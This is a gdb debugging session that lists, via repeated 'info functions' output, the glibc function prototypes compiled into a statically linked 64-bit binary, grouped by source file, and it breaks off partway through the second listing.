Elf64_Addr _dl_sysdep_start(void **, void (*)(const Elf64_Phdr *, Elf64_Word, Elf64_Addr *, Elf64_auxv_t *));
void _dl_sysdep_start_cleanup(void);

File ../iconv/skeleton.c:
int __gconv_transform_ascii_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ascii(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ucs2(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ucs2reverse(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, 
    const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ucs4(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ucs4le(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, 
    const unsigned char *, unsigned char **, size_t *, int, int);
---Type <return> to continue, or q <return> to quit---
int __gconv_transform_internal_utf8(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_ucs2_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_ucs2reverse_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, 
    const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_ucs4_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_ucs4le_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, 
    const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_utf8_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);

File ../include/ctype.h:
const uint16_t **__ctype_b_loc(void);
const int32_t **__ctype_tolower_loc(void);
const int32_t **__ctype_toupper_loc(void);

File ../intl/l10nflist.c:
struct loaded_l10nfile *_nl_make_l10nflist(struct loaded_l10nfile **, const char *, size_t, int, const char *, const char *, 
    const char *, const char *, const char *, const char *, int);
const char *_nl_normalize_codeset(const char *, size_t);

File ../login/updwtmp.c:
void __updwtmp(const char *, const struct utmp *);

File ../login/utmp_file.c:
static void endutent_file(void);
static int getutent_r_file(struct utmp *, struct utmp **);
static int getutid_r_file(const struct utmp *, struct utmp *, struct utmp **);
static int getutline_r_file(const struct utmp *, struct utmp *, struct utmp **);
static int internal_getut_r(const struct utmp *, struct utmp *, _Bool *);
static struct utmp *pututline_file(const struct utmp *);
static int setutent_file(void);
static void timeout_handler(int);
static int updwtmp_file(const char *, const struct utmp *);

File ../misc/sbrk.c:
void *__sbrk(intptr_t);

---Type <return> to continue, or q <return> to quit---
File ../misc/syslog.c:
void __GI___vsyslog_chk(int, int, const char *, struct __va_list_tag *);
void __syslog(int, const char *, ...);
void __syslog_chk(int, int, const char *, ...);
void __vsyslog(int, const char *, struct __va_list_tag *);
void closelog(void);
void openlog(const char *, int, int);
int setlogmask(int);
static void cancel_handler(void *);
static void openlog_internal(const char *, int, int);

File ../nptl/sigaction.c:
int __GI___sigaction(int, const struct sigaction *, struct sigaction *);
int __sigaction(int, const struct sigaction *, struct sigaction *);

File ../nss/getXXbyYY.c:
struct aliasent *getaliasbyname(const char *);
struct group *getgrgid(gid_t);
struct group *getgrnam(const char *);
struct hostent *gethostbyaddr(const void *, socklen_t, int);
struct hostent *gethostbyname(const char *);
struct hostent *gethostbyname2(const char *, int);
struct netent *getnetbyaddr(uint32_t, int);
struct netent *getnetbyname(const char *);
struct protoent *getprotobyname(const char *);
struct protoent *getprotobynumber(int);
struct passwd *getpwnam(const char *);
struct passwd *getpwuid(uid_t);
struct rpcent *getrpcbyname(const char *);
struct rpcent *getrpcbynumber(int);
struct servent *getservbyname(const char *, const char *);
struct servent *getservbyport(int, const char *);
struct sgrp *getsgnam(const char *);
struct spwd *getspnam(const char *);

File ../nss/getXXbyYY_r.c:
int __getaliasbyname_r(const char *, struct aliasent *, char *, size_t, struct aliasent **);
int __getgrgid_r(gid_t, struct group *, char *, size_t, struct group **);
int __getgrnam_r(const char *, struct group *, char *, size_t, struct group **);
int __gethostbyaddr_r(const void *, socklen_t, int, struct hostent *, char *, size_t, struct hostent **, int *);
---Type <return> to continue, or q <return> to quit---
int __gethostbyname2_r(const char *, int, struct hostent *, char *, size_t, struct hostent **, int *);
int __gethostbyname_r(const char *, struct hostent *, char *, size_t, struct hostent **, int *);
int __getnetbyaddr_r(uint32_t, int, struct netent *, char *, size_t, struct netent **, int *);
int __getnetbyname_r(const char *, struct netent *, char *, size_t, struct netent **, int *);
int __getprotobyname_r(const char *, struct protoent *, char *, size_t, struct protoent **);
int __getprotobynumber_r(int, struct protoent *, char *, size_t, struct protoent **);
int __getpwnam_r(const char *, struct passwd *, char *, size_t, struct passwd **);
int __getpwuid_r(uid_t, struct passwd *, char *, size_t, struct passwd **);
int __getrpcbyname_r(const char *, struct rpcent *, char *, size_t, struct rpcent **);
int __getrpcbynumber_r(int, struct rpcent *, char *, size_t, struct rpcent **);
int __getservbyname_r(const char *, const char *, struct servent *, char *, size_t, struct servent **);
int __getservbyport_r(int, const char *, struct servent *, char *, size_t, struct servent **);
int __getsgnam_r(const char *, struct sgrp *, char *, size_t, struct sgrp **);
int __getspnam_r(const char *, struct spwd *, char *, size_t, struct spwd **);

File ../nss/getXXent.c:
struct aliasent *getaliasent(void);
struct group *getgrent(void);
struct hostent *gethostent(void);
struct netent *getnetent(void);
struct protoent *getprotoent(void);
struct passwd *getpwent(void);
struct rpcent *getrpcent(void);
struct servent *getservent(void);
struct sgrp *getsgent(void);
struct spwd *getspent(void);

File ../nss/getXXent_r.c:
int __getaliasent_r(struct aliasent *, char *, size_t, struct aliasent **);
int __getgrent_r(struct group *, char *, size_t, struct group **);
int __gethostent_r(struct hostent *, char *, size_t, struct hostent **, int *);
int __getnetent_r(struct netent *, char *, size_t, struct netent **, int *);
int __getprotoent_r(struct protoent *, char *, size_t, struct protoent **);
int __getpwent_r(struct passwd *, char *, size_t, struct passwd **);
int __getrpcent_r(struct rpcent *, char *, size_t, struct rpcent **);
int __getservent_r(struct servent *, char *, size_t, struct servent **);
int __getsgent_r(struct sgrp *, char *, size_t, struct sgrp **);
int __getspent_r(struct spwd *, char *, size_t, struct spwd **);
void endaliasent(void);
void endgrent(void);
---Type <return> to continue, or q <return> to quit---
void endhostent(void);
void endnetent(void);
void endprotoent(void);
void endpwent(void);
void endrpcent(void);
void endservent(void);
void endsgent(void);
void endspent(void);
void setaliasent(void);
void setgrent(void);
void sethostent(int);
void setnetent(int);
void setprotoent(int);
void setpwent(void);
void setrpcent(int);
void setservent(int);
void setsgent(void);
void setspent(void);

File ../posix/glob.c:
int __GI_glob(const char *, int, int (*)(const char *, int), glob_t *);
void __GI_globfree(glob_t *);
int __glob_pattern_p(const char *, int);
int __glob_pattern_type(const char *, int);
static int collated_compare(const void *, const void *);
static int glob_in_dir(const char *, const char *, int, int (*)(const char *, int), glob_t *, size_t);
static int link_exists2_p(const char *, size_t, const char *, glob_t *);
static int prefix_array(const char *, char **, size_t);

File ../posix/sched_cpucount.c:
static int generic_cpucount(size_t, const cpu_set_t *);
static int popcount_cpucount(size_t, const cpu_set_t *);

File ../setjmp/longjmp.c:
void __longjmp_chk(struct __jmp_buf_tag *, int);

File ../signal/allocrtsig.c:
int __GI___libc_current_sigrtmax(void);
int __GI___libc_current_sigrtmin(void);
int __libc_allocate_rtsig(int);
---Type <return> to continue, or q <return> to quit---

File ../signal/sigfillset.c:
int __GI_sigfillset(sigset_t *);

File ../signal/sigreturn.c:
int __sigreturn(struct sigcontext *);

File ../socket/sa_len.c:
int __GI___libc_sa_len(sa_family_t);

File ../stdio-common/printf_fphex.c:
int __printf_fphex(_IO_FILE *, const struct printf_info *, const void * const *);

File ../stdlib/gmp.h:
mp_limb_t __mpn_add(mp_ptr, mp_srcptr, mp_size_t, mp_srcptr, mp_size_t);
mp_limb_t __mpn_add_1(mp_ptr, mp_srcptr, mp_size_t, mp_limb_t);
mp_limb_t __mpn_sub(mp_ptr, mp_srcptr, mp_size_t, mp_srcptr, mp_size_t);
mp_limb_t __mpn_sub_1(mp_ptr, mp_srcptr, mp_size_t, mp_limb_t);

File ../stdlib/labs.c:
long labs(long);

File ../stdlib/ldiv.c:
ldiv_t ldiv(long, long);

File ../stdlib/strtod.c:
double __GI___wcstod_internal(const wchar_t *, wchar_t **, int);
float __GI___wcstof_internal(const wchar_t *, wchar_t **, int);
long double __GI___wcstold_internal(const wchar_t *, wchar_t **, int);
double __GI_wcstod(const wchar_t *, wchar_t **);
float __GI_wcstof(const wchar_t *, wchar_t **);
long double __GI_wcstold(const wchar_t *, wchar_t **);

File ../stdlib/strtod_l.c:
long double __GI_____strtold_l_internal(const char *, char **, int, __locale_t);
long double __GI___strtold_l(const char *, char **, __locale_t);
double __GI___wcstod_l(const wchar_t *, wchar_t **, __locale_t);
float __GI___wcstof_l(const wchar_t *, wchar_t **, __locale_t);
long double __GI___wcstold_l(const wchar_t *, wchar_t **, __locale_t);
double ____wcstod_l_internal(const wchar_t *, wchar_t **, int, __locale_t);
---Type <return> to continue, or q <return> to quit---
float ____wcstof_l_internal(const wchar_t *, wchar_t **, int, __locale_t);
long double ____wcstold_l_internal(const wchar_t *, wchar_t **, int, __locale_t);
static long double round_and_return(mp_limb_t *, intmax_t, int, mp_limb_t, mp_size_t, int);
static const char *str_to_mpn(const char *, int, mp_limb_t *, mp_size_t *, intmax_t *, size_t, const char *, const char *);

File ../stdlib/strtod_nan_main.c:
double __GI___wcstod_nan(const wchar_t *, wchar_t **, wchar_t);
float __GI___wcstof_nan(const wchar_t *, wchar_t **, wchar_t);
long double __GI___wcstold_nan(const wchar_t *, wchar_t **, wchar_t);

File ../stdlib/strtol.c:
long __GI___strtol_internal(const char *, char **, int, int);
unsigned long __GI___strtoul_internal(const char *, char **, int, int);
long __GI___wcstol_internal(const wchar_t *, wchar_t **, int, int);
unsigned long __GI___wcstoul_internal(const wchar_t *, wchar_t **, int, int);
long __strtol(const char *, char **, int);
unsigned long __strtoul(const char *, char **, int);
long __wcstol(const wchar_t *, wchar_t **, int);
unsigned long __wcstoul(const wchar_t *, wchar_t **, int);

File ../stdlib/strtol_l.c:
long __GI_____strtol_l_internal(const char *, char **, int, int, __locale_t);
unsigned long __GI_____strtoul_l_internal(const char *, char **, int, int, __locale_t);
long __GI___strtol_l(const char *, char **, int, __locale_t);
unsigned long __GI___strtoul_l(const char *, char **, int, __locale_t);
long __GI___wcstol_l(const wchar_t *, wchar_t **, int, __locale_t);
unsigned long __GI___wcstoul_l(const wchar_t *, wchar_t **, int, __locale_t);
long ____wcstol_l_internal(const wchar_t *, wchar_t **, int, int, __locale_t);
unsigned long ____wcstoul_l_internal(const wchar_t *, wchar_t **, int, int, __locale_t);

File ../string/bits/string2.h:
void *__mempcpy_small(void *, char, char, char, char, __uint16_t, __uint16_t, __uint32_t, __uint32_t, size_t);
char *__stpcpy_small(char *, __uint16_t, __uint16_t, __uint32_t, __uint32_t, size_t);
char *__strcpy_small(char *, __uint16_t, __uint16_t, __uint32_t, __uint32_t, size_t);
size_t __strcspn_c1(const char *, int);
size_t __strcspn_c2(const char *, int, int);
size_t __strcspn_c3(const char *, int, int, int);
char *__strpbrk_c2(const char *, int, int);
char *__strpbrk_c3(const char *, int, int, int);
char *__strsep_1c(char **, char);
---Type <return> to continue, or q <return> to quit---
char *__strsep_2c(char **, char, char);
char *__strsep_3c(char **, char, char, char);
size_t __strspn_c1(const char *, int);
size_t __strspn_c2(const char *, int, int);
size_t __strspn_c3(const char *, int, int, int);
char *__strtok_r_1c(char *, char, char **);

File ../string/memmove.c:
void *__memmove_sse2(void *, const void *, size_t);
void *memmove(void *, const void *, size_t);

File ../string/str-two-way.h:
static char *two_way_long_needle(const unsigned char *, size_t, const unsigned char *, size_t);

File ../string/strcasecmp.c:
int __strcasecmp_l_nonascii(const char *, const char *, __locale_t);

File ../string/strcoll.c:
int __GI___wcscoll(const wchar_t *, const wchar_t *);

File ../string/strcoll_l.c:
int __GI___wcscoll_l(const wchar_t *, const wchar_t *, __locale_t);

File ../string/strncase.c:
int __strncasecmp_l_nonascii(const char *, const char *, size_t, __locale_t);

File ../string/strncat.c:
char *__strncat_sse2(char *, const char *, size_t);

File ../string/strstr.c:
char *__strstr_sse2(const char *, const char *);

File ../string/strxfrm.c:
size_t wcsxfrm(wchar_t *, const wchar_t *, size_t);

File ../string/strxfrm_l.c:
size_t __GI___wcsxfrm_l(wchar_t *, const wchar_t *, size_t, __locale_t);

File ../sysdeps/gnu/getutmp.c:
void getutmp(const struct utmpx *, struct utmp *);
---Type <return> to continue, or q <return> to quit---

File ../sysdeps/gnu/unwind-resume.c:
void _Unwind_Resume(struct _Unwind_Exception *);
_Unwind_Reason_Code __gcc_personality_v0(int, _Unwind_Action, _Unwind_Exception_Class, struct _Unwind_Exception *, 
    struct _Unwind_Context *);
void __libgcc_s_init(void);

File ../sysdeps/i386/fpu/s_isinfl.c:
int __GI___isinfl(long double);

File ../sysdeps/i386/fpu/s_isnanl.c:
int __GI___isnanl(long double);

File ../sysdeps/ieee754/dbl-64/dbl2mpn.c:
mp_size_t __mpn_extract_double(mp_ptr, mp_size_t, int *, int *, double);

File ../sysdeps/ieee754/dbl-64/mpn2dbl.c:
double __mpn_construct_double(mp_srcptr, int, int);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_finite.c:
int __GI___finite(double);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_frexp.c:
double __frexp(double, int *);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_isinf.c:
int __GI___isinf(double);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_isnan.c:
int __GI___isnan(double);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_modf.c:
double __modf(double, double *);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_scalbn.c:
double __scalbn(double, int);

File ../sysdeps/ieee754/flt-32/mpn2flt.c:
float __mpn_construct_float(mp_srcptr, int, int);

---Type <return> to continue, or q <return> to quit---
File ../sysdeps/ieee754/flt-32/s_finitef.c:
int __GI___finitef(float);

File ../sysdeps/ieee754/flt-32/s_frexpf.c:
float __frexpf(float, int *);

File ../sysdeps/ieee754/flt-32/s_isinff.c:
int __GI___isinff(float);

File ../sysdeps/ieee754/flt-32/s_isnanf.c:
int __GI___isnanf(float);

File ../sysdeps/ieee754/flt-32/s_modff.c:
float __modff(float, float *);

File ../sysdeps/ieee754/flt-32/s_scalbnf.c:
float __scalbnf(float, int);

File ../sysdeps/ieee754/ldbl-96/mpn2ldbl.c:
long double __mpn_construct_long_double(mp_srcptr, int, int);

File ../sysdeps/ieee754/ldbl-96/s_frexpl.c:
long double __frexpl(long double, int *);

File ../sysdeps/ieee754/ldbl-96/s_modfl.c:
long double __modfl(long double, long double *);

File ../sysdeps/ieee754/ldbl-96/s_signbitl.c:
int __signbitl(long double);

File ../sysdeps/nptl/fork.c:
pid_t __libc_fork(void);

File ../sysdeps/nptl/jmp-unwind.c:
void _longjmp_unwind(struct __jmp_buf_tag *, int);

File ../sysdeps/posix/clock_getres.c:
int __clock_getres(clockid_t, struct timespec *);

File ../sysdeps/posix/closedir.c:
---Type <return> to continue, or q <return> to quit---
int __closedir(DIR *);

File ../sysdeps/posix/ctermid.c:
char *ctermid(char *);

File ../sysdeps/posix/cuserid.c:
char *cuserid(char *);

File ../sysdeps/posix/dirfd.c:
int dirfd(DIR *);

File ../sysdeps/posix/euidaccess.c:
int __euidaccess(const char *, int);

File ../sysdeps/posix/fdopendir.c:
DIR *__fdopendir(int);

File ../sysdeps/posix/gai_strerror.c:
const char *__GI_gai_strerror(int);

File ../sysdeps/posix/getaddrinfo.c:
void __GI_freeaddrinfo(struct addrinfo *);
int __GI_getaddrinfo(const char *, const char *, const struct addrinfo *, struct addrinfo **);
static _Bool convert_hostent_to_gaih_addrtuple(int, struct hostent *, struct gaih_addrtuple **, const struct addrinfo *);
static void fini(void);
static void gaiconf_init(void);
static int gaih_inet(const char *, const struct gaih_service *, const struct addrinfo *, struct addrinfo **, unsigned int *);
static int gaih_inet_serv(const char *, const struct gaih_typeproto *, struct gaih_servtuple *, const struct addrinfo *);
static int in6aicmp(const void *, const void *);
static int prefixcmp(const void *, const void *);
static int rfc3484_sort(const void *, const void *, void *);
static int scopecmp(const void *, const void *);

File ../sysdeps/posix/getdtsz.c:
int __getdtablesize(void);

File ../sysdeps/posix/gethostname.c:
int __gethostname(char *, size_t);

File ../sysdeps/posix/isatty.c:
---Type <return> to continue, or q <return> to quit---
int __isatty(int);

File ../sysdeps/posix/isfdtype.c:
int isfdtype(int, int);

File ../sysdeps/posix/killpg.c:
int killpg(__pid_t, int);

File ../sysdeps/posix/libc_fatal.c:
void __GI___libc_fatal(const char *);
void __libc_message(int, const char *, ...);

File ../sysdeps/posix/mkfifo.c:
int mkfifo(const char *, mode_t);

File ../sysdeps/posix/mkfifoat.c:
int mkfifoat(int, const char *, mode_t);

File ../sysdeps/posix/nice.c:
int nice(int);

File ../sysdeps/posix/opendir.c:
DIR *__alloc_dir(int, _Bool, int, const struct stat64 *);
DIR *__opendir(const char *);
DIR *__opendirat(int, const char *);

File ../sysdeps/posix/posix_fallocate.c:
static int internal_fallocate(int, __off_t, __off_t);

File ../sysdeps/posix/profil.c:
int __profil(u_short *, size_t, size_t, u_int);

File ../sysdeps/posix/readdir.c:
struct dirent *__readdir(DIR *);

File ../sysdeps/posix/readdir_r.c:
int __readdir_r(DIR *, struct dirent *, struct dirent **);

File ../sysdeps/posix/remove.c:
int __GI_remove(const char *);
---Type <return> to continue, or q <return> to quit---

File ../sysdeps/posix/rewinddir.c:
void __GI___rewinddir(DIR *);
void __rewinddir(DIR *);

File ../sysdeps/posix/seekdir.c:
void seekdir(DIR *, long);

File ../sysdeps/posix/sigblock.c:
int __sigblock(int);

File ../sysdeps/posix/sigignore.c:
int sigignore(int);

File ../sysdeps/posix/sigintr.c:
int siginterrupt(int, int);

File ../sysdeps/posix/signal.c:
__sighandler_t __bsd_signal(int, __sighandler_t);

File ../sysdeps/posix/sigpause.c:
int __GI___sigpause(int, int);
int __default_sigpause(int);
int __xpg_sigpause(int);

File ../sysdeps/posix/sigset.c:
__sighandler_t sigset(int, __sighandler_t);

File ../sysdeps/posix/sigsetmask.c:
int __sigsetmask(int);

File ../sysdeps/posix/sleep.c:
unsigned int __sleep(unsigned int);

File ../sysdeps/posix/spawni.c:
int __spawni(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char * const *, char * const *, 
    int);

File ../sysdeps/posix/sprofil.c:
int __sprofil(struct prof *, int, struct timeval *, unsigned int);
---Type <return> to continue, or q <return> to quit---
static int insert(int, unsigned long, unsigned long, struct prof *, int);
static int pcmp(const void *, const void *);

File ../sysdeps/posix/sysconf.c:
static long __sysconf_check_spec(const char *);

File ../sysdeps/posix/system.c:
int __libc_system(const char *);
static int do_system(const char *);

File ../sysdeps/posix/sysv_signal.c:
__sighandler_t __sysv_signal(int, __sighandler_t);

File ../sysdeps/posix/telldir.c:
long telldir(DIR *);

File ../sysdeps/posix/tempname.c:
int __gen_tempname(char *, int, int, int);
int __path_search(char *, size_t, const char *, const char *, int);

File ../sysdeps/posix/ulimit.c:
long __ulimit(int, ...);

File ../sysdeps/posix/usleep.c:
int usleep(useconds_t);

File ../sysdeps/pthread/flockfile.c:
void __flockfile(FILE *);

File ../sysdeps/pthread/ftrylockfile.c:
int __ftrylockfile(FILE *);

File ../sysdeps/pthread/funlockfile.c:
void __funlockfile(FILE *);

File ../sysdeps/unix/bsd/ftime.c:
int ftime(struct timeb *);

File ../sysdeps/unix/bsd/getpt.c:
int __bsd_getpt(void);
---Type <return> to continue, or q <return> to quit---

File ../sysdeps/unix/bsd/tcgetpgrp.c:
pid_t __GI_tcgetpgrp(int);

File ../sysdeps/unix/bsd/tcsetpgrp.c:
int tcsetpgrp(int, pid_t);

File ../sysdeps/unix/bsd/ualarm.c:
useconds_t ualarm(useconds_t, useconds_t);

File ../sysdeps/unix/bsd/wait3.c:
pid_t __wait3(__WAIT_STATUS, int, struct rusage *);

File ../sysdeps/unix/clock_gettime.c:
int __GI___clock_gettime(clockid_t, struct timespec *);

File ../sysdeps/unix/clock_settime.c:
int __clock_settime(clockid_t, const struct timespec *);

File ../sysdeps/unix/get_child_max.c:
long __get_child_max(void);

File ../sysdeps/unix/getlogin.c:
static char *getlogin_fd0(void);

File ../sysdeps/unix/getlogin_r.c:
static int getlogin_r_fd0(char *, size_t);

File ../sysdeps/unix/grantpt.c:
int grantpt(int);

File ../sysdeps/unix/sockatmark.c:
int sockatmark(int);

File ../sysdeps/unix/stime.c:
int stime(const time_t *);

File ../sysdeps/unix/sysv/linux/_exit.c:
void __GI__exit(int);

---Type <return> to continue, or q <return> to quit---
File ../sysdeps/unix/sysv/linux/accept4.c:
int accept4(int, __SOCKADDR_ARG, socklen_t *, int);

File ../sysdeps/unix/sysv/linux/adjtime.c:
int __adjtime(const struct timeval *, struct timeval *);

File ../sysdeps/unix/sysv/linux/bits/sigset.h:
int __sigaddset(__sigset_t *, int);
int __sigdelset(__sigset_t *, int);
int __sigismember(const __sigset_t *, int);

File ../sysdeps/unix/sysv/linux/check_native.c:
void __check_native(uint32_t, int *, uint32_t, int *);

File ../sysdeps/unix/sysv/linux/check_pf.c:
void __check_pf(_Bool *, _Bool *, struct in6addrinfo **, size_t *);
void __free_in6ai(struct in6addrinfo *);
static void freecache(void);

File ../sysdeps/unix/sysv/linux/clock.c:
clock_t clock(void);

File ../sysdeps/unix/sysv/linux/clock_getcpuclockid.c:
int __clock_getcpuclockid(pid_t, clockid_t *);

File ../sysdeps/unix/sysv/linux/clock_nanosleep.c:
int __clock_nanosleep(clockid_t, int, const struct timespec *, struct timespec *);

File ../sysdeps/unix/sysv/linux/cmsg_nxthdr.c:
struct cmsghdr *__cmsg_nxthdr(struct msghdr *, struct cmsghdr *);

File ../sysdeps/unix/sysv/linux/dl-execstack.c:
int __GI__dl_make_stack_executable(void **);

File ../sysdeps/unix/sysv/linux/dl-openat64.c:
int openat64(int, const char *, int, ...);

File ../sysdeps/unix/sysv/linux/dl-origin.c:
const char *_dl_get_origin(void);

---Type <return> to continue, or q <return> to quit---
File ../sysdeps/unix/sysv/linux/dl-sysdep.c:
int _dl_discover_osversion(void);

File ../sysdeps/unix/sysv/linux/dl-vdso.c:
void *_dl_vdso_vsym(const char *, const struct r_found_version *);

File ../sysdeps/unix/sysv/linux/epoll_pwait.c:
int __GI_epoll_pwait(int, struct epoll_event *, int, int, const sigset_t *);

File ../sysdeps/unix/sysv/linux/eventfd.c:
int eventfd(unsigned int, int);

File ../sysdeps/unix/sysv/linux/eventfd_read.c:
int eventfd_read(int, eventfd_t *);

File ../sysdeps/unix/sysv/linux/eventfd_write.c:
int eventfd_write(int, eventfd_t);

File ../sysdeps/unix/sysv/linux/faccessat.c:
int faccessat(int, const char *, int, int);

File ../sysdeps/unix/sysv/linux/fchmodat.c:
int fchmodat(int, const char *, mode_t, int);

File ../sysdeps/unix/sysv/linux/fcntl.c:
int __GI___libc_fcntl(int, int, ...);
int __fcntl_nocancel(int, int, ...);
int __libc_fcntl(int, int, ...);

File ../sysdeps/unix/sysv/linux/fexecve.c:
int fexecve(int, char * const *, char * const *);

File ../sysdeps/unix/sysv/linux/fpathconf.c:
long __fpathconf(int, int);

File ../sysdeps/unix/sysv/linux/futimens.c:
int futimens(int, const struct timespec *);

File ../sysdeps/unix/sysv/linux/futimes.c:
int __futimes(int, const struct timeval *);
---Type <return> to continue, or q <return> to quit---

File ../sysdeps/unix/sysv/linux/futimesat.c:
int futimesat(int, const char *, const struct timeval *);

File ../sysdeps/unix/sysv/linux/gai_sigqueue.c:
int __gai_sigqueue(int, const union sigval, pid_t);

File ../sysdeps/unix/sysv/linux/getclktck.c:
int __getclktck(void);

File ../sysdeps/unix/sysv/linux/getcwd.c:
char *__getcwd(char *, size_t);

File ../sysdeps/unix/sysv/linux/getdents.c:
ssize_t __getdents(int, char *, size_t);

File ../sysdeps/unix/sysv/linux/gethostid.c:
long gethostid(void);
int sethostid(long);

File ../sysdeps/unix/sysv/linux/getipv4sourcefilter.c:
int getipv4sourcefilter(int, struct in_addr, struct in_addr, uint32_t *, uint32_t *, struct in_addr *);

File ../sysdeps/unix/sysv/linux/getloadavg.c:
int getloadavg(double *, int);

File ../sysdeps/unix/sysv/linux/getlogin.c:
char *getlogin(void);

File ../sysdeps/unix/sysv/linux/getlogin_r.c:
int __GI___getlogin_r(char *, size_t);
int __getlogin_r_loginuid(char *, size_t);

File ../sysdeps/unix/sysv/linux/getpagesize.c:
int __GI___getpagesize(void);

File ../sysdeps/unix/sysv/linux/getpid.c:
pid_t __GI___getpid(void);
pid_t __getpid(void);

---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) 
(gdb) 
(gdb) 
(gdb) info functions
All defined functions:

File ../bits/stdlib-bsearch.h:
void *__GI_bsearch(const void *, const void *, size_t, size_t, __compar_fn_t);

File ../csu/init-first.c:
void __libc_init_first(int, char **, char **);
void _dl_start(void);
void _init(int, char **, char **);

File ../csu/libc-start.c:
int __libc_start_main(int (*)(int, char **, char **), int, char **, int (*)(int, char **, char **), void (*)(void), void (*)(void), 
    void *);

File ../debug/memmove_chk.c:
void *__memmove_chk_sse2(void *, const void *, size_t, size_t);

File ../elf/dl-runtime.c:
void _dl_call_pltexit(struct link_map *, Elf64_Word, const void *, void *);
Elf64_Addr _dl_fixup(struct link_map *, Elf64_Word);
Elf64_Addr _dl_profile_fixup(struct link_map *, Elf64_Word, Elf64_Addr, void *, long *);

File ../elf/dl-sysdep.c:
void _dl_show_auxv(void);
Elf64_Addr _dl_sysdep_start(void **, void (*)(const Elf64_Phdr *, Elf64_Word, Elf64_Addr *, Elf64_auxv_t *));
void _dl_sysdep_start_cleanup(void);

File ../iconv/skeleton.c:
int __gconv_transform_ascii_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ascii(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ucs2(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ucs2reverse(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, 
    const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ucs4(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ucs4le(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, 
    const unsigned char *, unsigned char **, size_t *, int, int);
---Type <return> to continue, or q <return> to quit---
int __gconv_transform_internal_utf8(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_ucs2_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_ucs2reverse_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, 
    const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_ucs4_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_ucs4le_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, 
    const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_utf8_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);

File ../include/ctype.h:
const uint16_t **__ctype_b_loc(void);
const int32_t **__ctype_tolower_loc(void);
const int32_t **__ctype_toupper_loc(void);

File ../intl/l10nflist.c:
struct loaded_l10nfile *_nl_make_l10nflist(struct loaded_l10nfile **, const char *, size_t, int, const char *, const char *, 
    const char *, const char *, const char *, const char *, int);
const char *_nl_normalize_codeset(const char *, size_t);

File ../login/updwtmp.c:
void __updwtmp(const char *, const struct utmp *);

File ../login/utmp_file.c:
static void endutent_file(void);
static int getutent_r_file(struct utmp *, struct utmp **);
static int getutid_r_file(const struct utmp *, struct utmp *, struct utmp **);
static int getutline_r_file(const struct utmp *, struct utmp *, struct utmp **);
static int internal_getut_r(const struct utmp *, struct utmp *, _Bool *);
static struct utmp *pututline_file(const struct utmp *);
static int setutent_file(void);
static void timeout_handler(int);
static int updwtmp_file(const char *, const struct utmp *);

File ../misc/sbrk.c:
void *__sbrk(intptr_t);

---Type <return> to continue, or q <return> to quit---
File ../misc/syslog.c:
void __GI___vsyslog_chk(int, int, const char *, struct __va_list_tag *);
void __syslog(int, const char *, ...);
void __syslog_chk(int, int, const char *, ...);
void __vsyslog(int, const char *, struct __va_list_tag *);
void closelog(void);
void openlog(const char *, int, int);
int setlogmask(int);
static void cancel_handler(void *);
static void openlog_internal(const char *, int, int);

File ../nptl/sigaction.c:
int __GI___sigaction(int, const struct sigaction *, struct sigaction *);
int __sigaction(int, const struct sigaction *, struct sigaction *);

File ../nss/getXXbyYY.c:
struct aliasent *getaliasbyname(const char *);
struct group *getgrgid(gid_t);
